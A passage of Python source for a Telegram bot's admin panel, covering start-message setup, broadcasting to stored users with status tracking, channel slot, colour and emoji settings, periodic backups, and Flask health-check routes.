    bot.reply_to(m, "✅ Switched to 7-button mode!", reply_markup=get_admin_kb())

@bot.message_handler(func=lambda m: m.text == "SET PHOTO" and is_admin(m.from_user.id))
def set_photo(m):
    msg = bot.reply_to(m, "📸 Send photo for /start:\n\n(Photo text ke upar dikhegi)")
    bot.register_next_step_handler(msg, save_photo)

def save_photo(m):
    if m.photo:
        cfg = get_config()
        cfg["photo"] = m.photo[-1].file_id
        save_config(cfg)
        bot.reply_to(m, "✅ PHOTO SET!\n\nPhoto ab text ke upar dikhegi.", reply_markup=get_admin_kb())
    else:
        bot.reply_to(m, "❌ Send a photo!", reply_markup=get_admin_kb())

@bot.message_handler(func=lambda m: m.text == "SET START TEXT" and is_admin(m.from_user.id))
def set_text(m):
    msg = bot.reply_to(m, "Send start text (use {name}, HTML allowed):\n\n💡 Tip: Use (6057713558945273148) for premium emoji!\n\n📌 CLICK HERE ya GET KEY me link lagega agar SET CLICK LINK set hai.")
    bot.register_next_step_handler(msg, save_text)

def save_text(m):
    if m.text.startswith("/") or m.text in ADMIN_BUTTONS:
        bot.send_message(m.chat.id, "❌ Cancelled! Please send text message only.", reply_markup=get_admin_kb())
        return
    cfg = get_config()
    cfg["text"] = m.html_text if hasattr(m, "html_text") else m.text
    save_config(cfg)
    bot.reply_to(m, "✅ TEXT SAVED!\n\n💡 Text mein (ID) use karo, premium emoji ban jayega!\n📌 CLICK HERE ya GET KEY clickable hoga.", reply_markup=get_admin_kb())

@bot.message_handler(func=lambda m: m.text == "SET VOICE" and is_admin(m.from_user.id))
def set_voice(m):
    msg = bot.reply_to(m, "Send voice message for /start (caption will be saved):\n\n💡 Tip: Use (6057713558945273148) in caption for premium emoji!")
    bot.register_next_step_handler(msg, save_voice)

def save_voice(m):
    if m.voice:
        cfg = get_config()
        cfg["voice"] = m.voice.file_id
        if m.caption:
            cfg["voice_caption"] = m.caption
        else:
            cfg["voice_caption"] = ""
        save_config(cfg)
        bot.reply_to(m, "✅ VOICE SET!", reply_markup=get_admin_kb())
    else:
        bot.reply_to(m, "Send a voice message!", reply_markup=get_admin_kb())

@bot.message_handler(func=lambda m: m.text == "BROADCAST" and is_admin(m.from_user.id))
def broadcast_cmd(m):
    bot.reply_to(m, "╰┈➤ Please use /broadcast reply to the message you want to broadcast.")

@bot.message_handler(commands=["broadcast"])
def broadcast_reply(m):
    if not is_admin(m.from_user.id):
        return
    if not m.reply_to_message:
        bot.reply_to(m, "Please use /broadcast reply to the message you want to broadcast.")
        return
    target_users = list(get_users().keys())
    if not target_users:
        bot.reply_to(m, "No users!")
        return
    task_id = random.randint(1000000, 9999999)
    cfg = get_config()
    if "broadcast_tasks" not in cfg:
        cfg["broadcast_tasks"] = []
    task_data = {
        "task_id": task_id,
        "created_at": datetime.now().isoformat(),
        "total_users": len(target_users),
        "speed": cfg.get("broadcast_speed", 30),
        "status": "in progress",
        "current_position": 0,
        "progress": 0,
        "sent": 0,
        "failed": 0
    }
    cfg["broadcast_tasks"].append(task_data)
    save_config(cfg)
    bot.reply_to(m, f"📢 Broadcast Task Created ✅\n🆔 Task ID: {task_id}\nCurrent Position: 0\nStatus Code: 10\n\n🔍 You can check task status using the command /status")
    threading.Thread(target=send_broadcast_async, args=(m, task_id)).start()

def send_broadcast_async(original_msg, task_id):
    try:
        target_users = list(get_users().keys())
        cfg = get_config()
        speed = cfg.get("broadcast_speed", 30)
        total_users = len(target_users)
        tasks = cfg.get("broadcast_tasks", [])
        task = None
        for t in tasks:
            if t.get("task_id") == task_id:
                task = t
                break
        if not task:
            return
        sent = 0
        failed = 0
        for idx, uid in enumerate(target_users):
            try:
                bot.copy_message(int(uid), original_msg.chat.id, original_msg.reply_to_message.message_id)
                sent += 1
            except:
                failed += 1
            progress = (idx + 1) / total_users
            task["current_position"] = idx + 1
            task["progress"] = progress
            task["sent"] = sent
            task["failed"] = failed
            save_config(cfg)
            time.sleep(speed / 1000)
        task["status"] = "completed"
        task["progress"] = 1.0
        save_config(cfg)
    except Exception as e:
        print(f"Broadcast error: {e}")

@bot.message_handler(commands=["status"])
def status_cmd(m):
    if not is_admin(m.from_user.id):
        bot.reply_to(m, "You Are Not Admin")
        return
    cfg = get_config()
    tasks = cfg.get("broadcast_tasks", [])
    if not tasks:
        bot.reply_to(m, "No broadcast tasks found!")
        return
    latest_task = tasks[-1]
    task_id = latest_task.get("task_id", "N/A")
    current_pos = latest_task.get("current_position", 0)
    status_code = 20 if latest_task.get("status") == "completed" else 10
    total_users = len(get_users())
    progress = latest_task.get("progress", 0.0) * 100
    created_at = latest_task.get("created_at", datetime.now().isoformat())
    speed = latest_task.get("speed", cfg.get("broadcast_speed", 30))
    status = latest_task.get("status", "in progress")
    status_msg = f"""📊 Broadcast Status

🆔 Task ID: {task_id}
🔢 Current Position: {current_pos}
📋 Status Code: {status_code}
📊 Progress: {progress:.1f}%
🕒 Created At: {created_at}
📦 Total Users: {total_users}
⚡️ Speed: {speed}
📌 Status: {status}"""
    bot.reply_to(m, status_msg)

@bot.message_handler(func=lambda m: m.text == "TOTAL USERS" and is_admin(m.from_user.id))
def total_users(m):
    bot.reply_to(m, f"👥 TOTAL USERS: {len(get_users())}", reply_markup=get_admin_kb())

@bot.message_handler(func=lambda m: m.text.startswith("SET CHECK") and is_admin(m.from_user.id))
def set_check(m):
    try:
        num = int(m.text.split()[-1])
        if 1 <= num <= 8:
            if num <= 7:
                ch = get_channels()
                if num <= len(ch):
                    channel = ch[num - 1]
                    url = channel.get("url", "")
                    name = channel.get("name", f"Channel {num}")
                    if url:
                        bot.reply_to(m, f"✅ {name}:\n{url}\n\nLink is set!", reply_markup=get_admin_kb())
                    else:
                        bot.reply_to(m, f"❌ {name}: No link set!\n\nPlease use SET CHANNEL {num} to set link.", reply_markup=get_admin_kb())
                else:
                    bot.reply_to(m, f"Channel {num} not found!", reply_markup=get_admin_kb())
            else:
                bot.reply_to(m, "SET CHECK 8 is for Verify slot!", reply_markup=get_admin_kb())
        else:
            bot.reply_to(m, "Invalid number! Use SET CHECK 1-8", reply_markup=get_admin_kb())
    except:
        bot.reply_to(m, "Invalid format! Use SET CHECK 1-8", reply_markup=get_admin_kb())

@bot.message_handler(func=lambda m: m.text == "EDIT MENU" and is_admin(m.from_user.id))
def edit_menu(m):
    bot.send_message(m.chat.id, "✏️ EDIT MENU", reply_markup=get_edit_menu())

@bot.message_handler(func=lambda m: m.text == "EDIT SLOT" and is_admin(m.from_user.id))
def edit_slot(m):
    ch = get_channels()
    if not ch:
        bot.reply_to(m, "❌ No channels available!", reply_markup=get_admin_kb())
        return
    msg = "Send channel number to edit:\n" + "\n".join([f"{i+1}. {c['name']}" for i, c in enumerate(ch)])
    bot_msg = bot.reply_to(m, msg)
    bot.register_next_step_handler(bot_msg, edit_slot_num)

def edit_slot_num(m):
    try:
        idx = int(m.text) - 1
        ch = get_channels()
        if 0 <= idx < len(ch):
            msg = bot.reply_to(m, f"Send new name for {ch[idx]['name']}:")
            bot.register_next_step_handler(msg, lambda x: save_slot_name(x, idx))
        else:
            bot.reply_to(m, "❌ Invalid number!", reply_markup=get_admin_kb())
    except:
        bot.reply_to(m, "❌ Send a number!", reply_markup=get_admin_kb())

def save_slot_name(m, idx):
    if m.text.startswith("/") or m.text in ADMIN_BUTTONS:
        bot.send_message(m.chat.id, "❌ Cancelled!", reply_markup=get_admin_kb())
        return
    ch = get_channels()
    if 0 <= idx < len(ch):
        ch[idx]["name"] = m.text
        save_channels(ch)
        bot.reply_to(m, "✅ Channel name updated!", reply_markup=get_admin_kb())

@bot.message_handler(func=lambda m: m.text == "EDIT ALL SLOTS" and is_admin(m.from_user.id))
def edit_all_slots(m):
    msg = bot.reply_to(m, "Send template name:")
    bot.register_next_step_handler(msg, save_all_slots)

def save_all_slots(m):
    if m.text.startswith("/") or m.text in ADMIN_BUTTONS:
        bot.send_message(m.chat.id, "❌ Cancelled!", reply_markup=get_admin_kb())
        return
    template = m.text
    ch = get_channels()
    for i in range(len(ch)):
        ch[i]["name"] = f"{template} {i+1}"
    save_channels(ch)
    bot.reply_to(m, "✅ All channels updated!", reply_markup=get_admin_kb())

@bot.message_handler(func=lambda m: m.text == "EDIT VERIFY" and is_admin(m.from_user.id))
def edit_verify(m):
    msg = bot.reply_to(m, "Send new verify button text:")
    bot.register_next_step_handler(msg, save_verify_text)

def save_verify_text(m):
    if m.text.startswith("/") or m.text in ADMIN_BUTTONS:
        bot.send_message(m.chat.id, "❌ Cancelled!", reply_markup=get_admin_kb())
        return
    cfg = get_config()
    cfg["verify_button_text"] = m.text
    save_config(cfg)
    bot.reply_to(m, "✅ Verify button text updated!", reply_markup=get_admin_kb())

@bot.message_handler(func=lambda m: m.text == "SET SPEED" and is_admin(m.from_user.id))
def set_speed(m):
    msg = bot.reply_to(m, "Send broadcast speed (1-100):")
    bot.register_next_step_handler(msg, save_speed)

def save_speed(m):
    try:
        speed = int(m.text.strip())
        if 1 <= speed <= 100:
            cfg = get_config()
            cfg["broadcast_speed"] = speed
            save_config(cfg)
            bot.reply_to(m, f"✅ Speed set to {speed}", reply_markup=get_admin_kb())
        else:
            bot.reply_to(m, "Speed must be between 1 and 100!", reply_markup=get_admin_kb())
    except:
        bot.reply_to(m, "Send a number!", reply_markup=get_admin_kb())

@bot.message_handler(func=lambda m: m.text == "STATS" and is_admin(m.from_user.id))
def stats(m):
    s = get_stats()
    today = datetime.now().strftime("%Y-%m-%d")
    daily = s.get("daily", {})
    today_data = daily.get(today, {})
    bot.reply_to(m, f"""📊 STATS

Total Users: {s.get('joins', 0)}
Keys Generated: {s.get('keys', 0)}

📅 Today:
Joins: {today_data.get('j', 0)}
Keys: {today_data.get('k', 0)}

⏰ Started: {s.get('start_time', 'Unknown')}""", reply_markup=get_admin_kb())

@bot.message_handler(func=lambda m: m.text == "COLOR MENU" and is_admin(m.from_user.id))
def color_menu(m):
    bot.send_message(m.chat.id, "🎨 COLOR MENU", reply_markup=get_color_menu_kb())

@bot.message_handler(func=lambda m: m.text == "🎨 SET CH COLOR" and is_admin(m.from_user.id))
def set_ch_color(m):
    ch = get_channels()
    if not ch:
        bot.reply_to(m, "❌ No channels!", reply_markup=get_admin_kb())
        return
    txt = "Send channel number:\n" + "\n".join([f"{i+1}. {c['name']}" for i, c in enumerate(ch)])
    msg = bot.reply_to(m, txt)
    bot.register_next_step_handler(msg, lambda x: ch_color_num(x))

def ch_color_num(m):
    try:
        idx = int(m.text) - 1
        ch = get_channels()
        if 0 <= idx < len(ch):
            target = ch[idx]["name"]
            bot.send_message(m.chat.id, f"Select color for {target}:", reply_markup=get_color_kb("channel", target))
        else:
            bot.reply_to(m, "❌ Invalid number!", reply_markup=get_admin_kb())
    except:
        bot.reply_to(m, "❌ Send a number!", reply_markup=get_admin_kb())

@bot.message_handler(func=lambda m: m.text == "🎨 SET ALL COLORS" and is_admin(m.from_user.id))
def all_colors(m):
    bot.send_message(m.chat.id, "Select color for ALL channels:", reply_markup=get_color_kb("all_channel"))

@bot.message_handler(func=lambda m: m.text == "🎨 SET VERIFY COLOR" and is_admin(m.from_user.id))
def verify_color(m):
    bot.send_message(m.chat.id, "Select verify button color:", reply_markup=get_color_kb("verify"))

@bot.callback_query_handler(func=lambda c: c.data.startswith("color|"))
def color_cb(c):
    if c.data == "color_cancel":
        bot.answer_callback_query(c.id, "Cancelled")
        bot.edit_message_reply_markup(c.message.chat.id, c.message.message_id, reply_markup=None)
        return
    parts = c.data.split("|")
    action = parts[1]
    color = parts[-1]
    if action == "all_channel":
        for ch in get_channels():
            ch["color"] = color
        save_channels(get_channels())
        bot.answer_callback_query(c.id, f"✅ All channels color changed to {color}!")
        bot.edit_message_reply_markup(c.message.chat.id, c.message.message_id, reply_markup=None)
        bot.send_message(c.message.chat.id, f"🎨 All channel colors updated to {color}!")
    elif action == "verify":
        cfg = get_config()
        cfg["verify_button_color"] = color
        save_config(cfg)
        bot.answer_callback_query(c.id, f"✅ Verify color changed to {color}!")
        bot.edit_message_reply_markup(c.message.chat.id, c.message.message_id, reply_markup=None)
        bot.send_message(c.message.chat.id, f"🎨 Verify button color updated to {color}!")
    else:
        name = parts[2]
        for ch in get_channels():
            if ch["name"] == name:
                ch["color"] = color
                save_channels(get_channels())
                bot.answer_callback_query(c.id, f"✅ {name} color changed to {color}!")
                break
        bot.edit_message_reply_markup(c.message.chat.id, c.message.message_id, reply_markup=None)
        bot.send_message(c.message.chat.id, f"🎨 {name} color updated to {color}!")

@bot.message_handler(func=lambda m: m.text == "EMOJI MENU" and is_admin(m.from_user.id))
def emoji_menu(m):
    bot.send_message(m.chat.id, "🔢 EMOJI SETTINGS\n\nCustomize emoji for buttons:", reply_markup=get_emoji_menu_kb())

@bot.message_handler(func=lambda m: m.text == "🔢 SET ALL CH EMOJI" and is_admin(m.from_user.id))
def set_all_ch_emoji(m):
    msg = bot.reply_to(m, "Send custom emoji ID for ALL channel buttons:\n\n(Telegram custom emoji ID - like 6136464120779638846)\n\nSend '0' to reset to default.")
    bot.register_next_step_handler(msg, save_all_ch_emoji)

def save_all_ch_emoji(m):
    if m.text.startswith("/") or m.text in ADMIN_BUTTONS:
        bot.send_message(m.chat.id, "❌ Cancelled!", reply_markup=get_emoji_menu_kb())
        return
    emoji_id = m.text.strip()
    if emoji_id == "0":
        emoji_id = DEFAULT_JOIN_EMOJI_ID
        bot.reply_to(m, f"✅ Reset to default emoji: {DEFAULT_JOIN_EMOJI_ID}", reply_markup=get_emoji_menu_kb())
    else:
        try:
            int(emoji_id)
            bot.reply_to(m, f"✅ All channel emoji set to: {emoji_id}", reply_markup=get_emoji_menu_kb())
        except:
            bot.reply_to(m, "❌ Invalid emoji ID! Please send a number.", reply_markup=get_emoji_menu_kb())
            return
    cfg = get_config()
    cfg["channel_emoji_id"] = emoji_id
    save_config(cfg)

@bot.message_handler(func=lambda m: m.text == "🔢 SET VERIFY EMOJI" and is_admin(m.from_user.id))
def set_verify_emoji(m):
    msg = bot.reply_to(m, "Send custom emoji ID for VERIFY button:\n\n(Telegram custom emoji ID - like 5809972320529293335)\n\nSend '0' to reset to default.")
    bot.register_next_step_handler(msg, save_verify_emoji)

def save_verify_emoji(m):
    if m.text.startswith("/") or m.text in ADMIN_BUTTONS:
        bot.send_message(m.chat.id, "❌ Cancelled!", reply_markup=get_emoji_menu_kb())
        return
    emoji_id = m.text.strip()
    if emoji_id == "0":
        emoji_id = DEFAULT_CHECK_EMOJI_ID
        bot.reply_to(m, f"✅ Reset to default emoji: {DEFAULT_CHECK_EMOJI_ID}", reply_markup=get_emoji_menu_kb())
    else:
        try:
            int(emoji_id)
            bot.reply_to(m, f"✅ Verify emoji set to: {emoji_id}", reply_markup=get_emoji_menu_kb())
        except:
            bot.reply_to(m, "❌ Invalid emoji ID! Please send a number.", reply_markup=get_emoji_menu_kb())
            return
    cfg = get_config()
    cfg["verify_emoji_id"] = emoji_id
    save_config(cfg)

@bot.message_handler(func=lambda m: m.text == "❌ REMOVE EMOJI" and is_admin(m.from_user.id))
def remove_emoji(m):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("🗑 ALL CH EMOJI", callback_data="remove_ch_emoji", style="danger"),
        InlineKeyboardButton("🗑 VERIFY EMOJI", callback_data="remove_verify_emoji", style="danger")
    )
    kb.add(InlineKeyboardButton("🔙 BACK", callback_data="remove_emoji_back", style="primary"))
    bot.send_message(m.chat.id, "🗑 REMOVE EMOJI\n\nSelect which emoji to remove:", reply_markup=kb)

@bot.callback_query_handler(func=lambda c: c.data == "remove_ch_emoji")
def remove_ch_emoji_cb(c):
    cfg = get_config()
    cfg["channel_emoji_id"] = INVISIBLE_EMOJI_ID
    save_config(cfg)
    bot.answer_callback_query(c.id, "✅ Channel emoji removed! (Invisible)")
    bot.edit_message_text("✅ Channel emoji set to invisible!\n\nButton pe emoji nahi dikhega.", c.message.chat.id, c.message.message_id)

@bot.callback_query_handler(func=lambda c: c.data == "remove_verify_emoji")
def remove_verify_emoji_cb(c):
    cfg = get_config()
    cfg["verify_emoji_id"] = INVISIBLE_EMOJI_ID
    save_config(cfg)
    bot.answer_callback_query(c.id, "✅ Verify emoji removed! (Invisible)")
    bot.edit_message_text("✅ Verify emoji set to invisible!\n\nButton pe emoji nahi dikhega.", c.message.chat.id, c.message.message_id)

@bot.callback_query_handler(func=lambda c: c.data == "remove_emoji_back")
def remove_emoji_back_cb(c):
    bot.edit_message_text("🔢 EMOJI SETTINGS", c.message.chat.id, c.message.message_id, reply_markup=get_emoji_menu_kb())

@bot.message_handler(func=lambda m: m.text == "◀️ BACK" and is_admin(m.from_user.id))
def back_admin(m):
    bot.send_message(m.chat.id, "ADMIN PANEL", reply_markup=get_admin_kb())

@bot.message_handler(func=lambda m: m.text == "BACKUP" and is_admin(m.from_user.id))
def backup(m):
    backup_database()
    bot.reply_to(m, "📦 Backup created!", reply_markup=get_admin_kb())

@bot.callback_query_handler(func=lambda c: c.data == "back_admin")
def back_admin_cb(c):
    bot.edit_message_text("👑 ADMIN MANAGEMENT", c.message.chat.id, c.message.message_id, reply_markup=get_admins_menu())

@bot.callback_query_handler(func=lambda c: c.data == "admins_menu")
def admins_menu_cb(c):
    bot.edit_message_text("👑 ADMIN MANAGEMENT", c.message.chat.id, c.message.message_id, reply_markup=get_admins_menu())

# =====================================================================
# ==================== POLLING FUNCTION & BACKGROUND THREADS ==========
# =====================================================================

def run_bot_polling():
    print("🔄 Bot polling thread started.", flush=True)
    while True:
        try:
            print("⏳ Starting infinity polling...", flush=True)
            bot.infinity_polling(timeout=60, long_polling_timeout=30)
        except Exception as e:
            print(f"❌ Polling error: {e}", flush=True)
            emergency_backup_and_notify()
            print("⏰ Retrying in 10 seconds...", flush=True)
            time.sleep(10)

def periodic_backup_task():
    while True:
        time.sleep(10 * 60)  # 10 minute
        try:
            backup_database()
            print(f"Periodic backup done at {datetime.now()}")
        except Exception as e:
            print(f"Periodic backup error: {e}")

# =====================================================================
# ==================== SIGNAL HANDLERS ================================
# =====================================================================

def signal_handler(sig, frame):
    print(f"Signal {sig} received. Creating emergency backup...")
    emergency_backup_and_notify()
    sys.exit(0)

signal.signal(signal.SIGTERM, signal_handler)
signal.signal(signal.SIGINT, signal_handler)

# =====================================================================
# ==================== START BACKGROUND THREADS (MODULE LEVEL) =======
# =====================================================================

# यह thread module load होते ही start हो जाएगा – चाहे gunicorn चलाए या python app.py
print("🚀 Starting polling thread at module import...", flush=True)
polling_thread = threading.Thread(target=run_bot_polling, daemon=True)
polling_thread.start()

# Periodic backup thread
backup_thread = threading.Thread(target=periodic_backup_task, daemon=True)
backup_thread.start()

# =====================================================================
# ==================== FLASK ROUTES (Health Check) ===================
# =====================================================================

@flask_app.route('/')
def index():
    return "Bot is running!"

@flask_app.route('/ping')
def ping():
    return "pong"

@flask_app.route('/test')
def test_bot():
    try:
        bot.send_message(ADMIN_ID, "✅ Test message from bot (via /test endpoint)")
        return "Test message sent to admin!"
    except Exception as e:
        return f"Error: {e}"

# =====================================================================
# ==================== MAIN (for local run) ===========================
# =====================================================================

if __name__ == "__main__":
    print("=" * 60)
    print("🤖 PURE TELEGRAM BOT STARTED (LOCAL / TERMUX)")
    print(f"Users: {len(get_users())} | Channels: {len(get_channels())}")
    print("=" * 60)
    print("🔥 Emoji IDs: (number) -> premium emoji")
    print("📌 BOT OFF - /start silent (koi reply nahi)")
    print("📢 BROADCAST - /broadcast reply to any message")
    print("📊 STATUS - /status to check broadcast progress")
    print("🚨 EMERGENCY BACKUP - On SIGTERM/SIGINT")
    print("🌐 Web server listening on port", os.environ.get('PORT', 5000))
    print("=" * 60)

    try:
        bot.send_message(ADMIN_ID, f"✅ BOT STARTED (LOCAL)\nUsers: {len(get_users())}")
    except:
        pass

    # Local development – run Flask built-in server
    port = int(os.environ.get('PORT', 5000))
    flask_app.run(host='0.0.0.0', port=port)